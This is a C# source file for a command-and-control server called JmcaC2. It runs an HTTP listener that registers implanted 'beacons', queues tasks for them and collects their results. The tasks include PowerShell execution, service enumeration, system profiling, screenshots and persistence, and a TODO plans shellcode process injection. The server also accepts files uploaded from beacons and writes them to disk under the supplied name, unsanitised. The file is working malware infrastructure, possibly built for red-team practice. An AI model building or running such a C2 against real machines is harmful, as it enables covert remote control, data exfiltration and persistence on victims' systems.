using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;


namespace JmcaC2
{
    public class Program
    {
        static HttpListener listener = new HttpListener();
        static bool programRunning = true;
        static bool serverRunning = true;
        static int port = 27015;
        static int taskIdx = 0;


        static List<BeaconClient> Beacons = new List<BeaconClient>();
        static List<BeaconTask> BeaconTasks = new List<BeaconTask>();

        static BeaconClient? CurrentBeacon = null;
        static HashSet<string> ClientNames = new HashSet<string>();

        public static void Main(string[] args)
        {
            // plan for command and control server
            //   1. accept command line arguments
            //   2. start http server in separate thread
            //     2a. accept get requests for beacon tasks
            //     2b. accept post requests for task results
            //   3. accept stdin commands to add tasks, view results, etc.

            Console.WriteLine("Welcome to JmcaC2 Controller 🇯🇲");

            // setup the http listener
            listener.Prefixes.Add($"https://localhost:{port}/");
            listener.Start();

            Console.WriteLine($"HTTP Server started on port {port}");

            // handle connections in a separate thread
            Task.Run(HandleConnections);

            while (programRunning)
            {
                Console.Write("JmcaC2> ");
                // According to documentation it will return null only if you press CTRL + Z.
                string? cmd = Console.ReadLine();
                if (string.IsNullOrEmpty(cmd))
                {
                    continue; // ignore empty commands
                }

                string[] CommandParts = cmd.Trim().Split(" ", 2);
                string? CmdPrefix = CommandParts[0];
                string CmdArgs = CommandParts.Length > 1 ? CommandParts[1] : "";

                // process command
                switch (CmdPrefix)
                {
                    case "status":
                        Console.WriteLine("Server running: " + serverRunning);
                        break;
                    case "start":
                        if (!serverRunning)
                        {
                            serverRunning = true;
                            listener.Start();
                            Task.Run(() => HandleConnections());
                            Console.WriteLine("Server started");
                        }
                        else
                        {
                            Console.WriteLine("Server is already running");
                        }
                        break;
                    case "beacons":
                        PrintBeacons();
                        break;

                    case "use":
                        SetCurrentBeaconSession(CmdArgs);
                        break;
                    //  Dictionary<string, string> command = new Dictionary<string, string> { { CmdPrefix, CmdArgs } };
                    case "stop":
                        serverRunning = false;
                        listener.Stop();
                        Console.WriteLine("Server stopped");
                        break;
                    case "exit":
                        programRunning = false;
                        break;

                    case "tasks":
                        PrintTasks();
                        break;
                    //TODO: process injection command, with shellcode passed as DATA in BeaconTask

                    case "powershell":
                        CreateTask(CmdPrefix, CmdArgs);
                        break;

                    case "enumservices":
                        CreateTask(CmdPrefix, CmdArgs);
                        break;
                    case "sleep":
                        CreateTask(CmdPrefix, CmdArgs);
                        break;
                    case "systemprofile":
                        CreateTask(CmdPrefix, CmdArgs);
                        break;

                    case "screenshot":
                        CreateTask(CmdPrefix, CmdArgs);
                        break;
                    case "persistence":
                        CreateTask(CmdPrefix, CmdArgs);
                        break;


                    // add more commands as needed :)

                    default:
                        Console.WriteLine("Unknown command");
                        break;
                }
            }
        }


        // View currently active beacon connections


        static private void CreateTask(string CmdPrefix, string CmdArgs)
        {

            if (CurrentBeacon == null)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(" No active beacon selected. Run: use BeaconName");
                Console.ForegroundColor = ConsoleColor.White;
                return;
            }
            BeaconTasks.Add(new BeaconTask(CurrentBeacon.Name, taskIdx, CmdPrefix, CmdArgs));
            Console.WriteLine($"Added task #{taskIdx} for {CurrentBeacon.Name}");
            taskIdx++;
        }

        static private string GenerateClientName()
        {

            string ClientName;

            // TODO: COULD INFINITE LOOP IF HAVE AcN connections

            do
            {

                string[] Adjectives = {
                    "red","blue","quiet","fast","frozen","silver","dark","bright","wild","rapid",
                    "lone","brave","lucky","silent","stealthy","shadow","storm","fierce"
                };

                string[] Nouns = {
                    "wolf","hawk","tiger","eagle","shadow","river","mountain","lion","falcon",
                    "forest","blade","cloud","spider","viper","storm","flame"
                };

                int adjIndex = RandomNumberGenerator.GetInt32(Adjectives.Length);
                int nounIndex = RandomNumberGenerator.GetInt32(Nouns.Length);
                ClientName = $"{Adjectives[adjIndex].ToUpper()}_{Nouns[nounIndex].ToUpper()}";

            } while (ClientNames.Contains(ClientName));

            ClientNames.Add(ClientName);
            return ClientName;

        }

        public static void SetCurrentBeaconSession(string name)
        {
            if (string.IsNullOrWhiteSpace(name))
            {
                Console.WriteLine("Usage: use BeaconName");
                return;
            }

            foreach (var client in Beacons)
            {
                if (client.Name == name)
                {
                    CurrentBeacon = client;
                    Console.WriteLine($"Current beacon set to {client.Name}");
                    return;
                }
            }

            Console.WriteLine($"Beacon '{name}' not found");
        }
        public static void PrintBeacons()
        {
            if (Beacons == null || Beacons.Count == 0)
            {
                Console.WriteLine("No Active Connections!");
                return;
            }

            Console.WriteLine($"{"Beacon Name",-15} | {"Client IP",-14} | {"Last CheckIn",-20}");
            Console.WriteLine("--------------------------------------------------------------");

            foreach (var b in Beacons)
            {
                ConsoleColor prevColor = Console.ForegroundColor;

                bool isCurrent = CurrentBeacon != null &&
                                 !string.IsNullOrEmpty(b.Name) &&
                                 b.Name == CurrentBeacon.Name;

                if (isCurrent)
                    Console.ForegroundColor = ConsoleColor.DarkCyan;

                Console.WriteLine(b.ToString());

                Console.ForegroundColor = prevColor;

                // TODO: MAKE RED if configured last-checkin time > sleep time 
            }
        }



        public static void PrintTasks()
        {
            Console.WriteLine($"{"Client Name",-15} | {"Task Name",-14} | {"Task Args",-20}");
            Console.WriteLine("---------------------------------------------------------------");

            foreach (var task in BeaconTasks)
                Console.WriteLine($"{task,-15}");
        }

        // Handle incoming HTTP connections
        // GET requests are for beacon tasks
        // POST requests are for task results
        public static void HandleConnections()
        {
            while (serverRunning)
            {
                try
                {
                    var context = listener.GetContext();
                    var request = context.Request;
                    var response = context.Response;

                    // Handle GET request for beacon tasks
                    if (request.HttpMethod == "GET")
                    {

                        // MAJOR WEWOO FIXED: use custom header with beacon name. if not exist,
                        // add new client with generated name
                        string[]? values = request.Headers.GetValues("Beacon-Name");
                        string beaconName = string.Empty;
                        if (values == null)
                        {
                            BeaconClient NewClient = new BeaconClient(request.RemoteEndPoint.Address, DateTime.Now, GenerateClientName());
                            Beacons.Add(NewClient);

                            // TODO: default tasks?
                            //BeaconTasks.Add(new BeaconTask(NewClient.Name, "powershell", "ipconfig"));
                            Console.WriteLine($"Added {NewClient.Name}");
                            beaconName = NewClient.Name;
                        }
                        else
                        {
                            beaconName = values[0];
                            if (!ClientNames.Contains(beaconName))
                            {
                                // add the beacon again
                                BeaconClient NewClient = new BeaconClient(request.RemoteEndPoint.Address, DateTime.Now, GenerateClientName());
                                Beacons.Add(NewClient);
                            }
                            Console.WriteLine($"Received request for tasks from {beaconName}");
                        }

                        string responseString = string.Empty;
                        if (BeaconTasks.Count > 0)
                        {
                            foreach (BeaconTask task in BeaconTasks)
                            {
                                // only send PENDING tasks for this beacon
                                if (task.Name == beaconName && task.Status == TaskStatus.NotStarted)
                                {
                                    responseString += task + "\r\n\r\n";
                                    task.Status = TaskStatus.InProgress;
                                }
                            }
                        }

                        byte[] buffer = System.Text.Encoding.UTF8.GetBytes(responseString);
                        response.ContentLength64 = buffer.Length;
                        response.AddHeader("Beacon-Name", beaconName);
                        var output = response.OutputStream;
                        output.Write(buffer, 0, buffer.Length);
                        output.Close();

                    }
                    else if (request.HttpMethod == "POST")
                    {
                        // Handle POST request for task results
                        Console.WriteLine($"Received POST request for task results");
                        string? taskIdx = context.Request.Headers["Task-Index"];
                        if (taskIdx != null)
                        {
                            Console.WriteLine($"Task #{taskIdx} Results");
                        }

                        if (context.Request.Url!.OriginalString.Contains("upload"))
                        {
                            string? beaconName = context.Request.Headers["Beacon-Name"];
                            string? fileName = context.Request.Headers["File-Name"];
                            string? fileLengthStr = context.Request.Headers["File-Length"];

                            if (fileName is null || fileLengthStr is null)
                            {
                                Console.WriteLine("[-] Missing upload headers");
                                response.StatusCode = 400;
                                response.Close();
                                return;
                            }
                            long fileLength = long.Parse(fileLengthStr);

                            Console.WriteLine($"[+] Upload from: {beaconName}");
                            Console.WriteLine($"[+] File: {fileName}");
                            Console.WriteLine($"[+] Bytes: {fileLength}");


                            byte[] bytes = [];
                            using (var memoryStream = new MemoryStream())
                            {
                                context.Request.InputStream.CopyTo(memoryStream);
                                bytes = memoryStream.ToArray();
                            }

                            File.WriteAllBytes(fileName, bytes);

                        }
                        else
                        {

                            using (var reader = new System.IO.StreamReader(request.InputStream, request.ContentEncoding))
                            {
                                string result = reader.ReadToEnd();
                                Console.WriteLine(result);
                            }
                        }
                        response.StatusCode = (int)HttpStatusCode.OK;
                        response.Close();
                    }
                }
                catch (Exception e)
                {
                    // exception handling request
                    Console.WriteLine("Error handling connection: " + e.Message);
                }
            }
        }
    }
}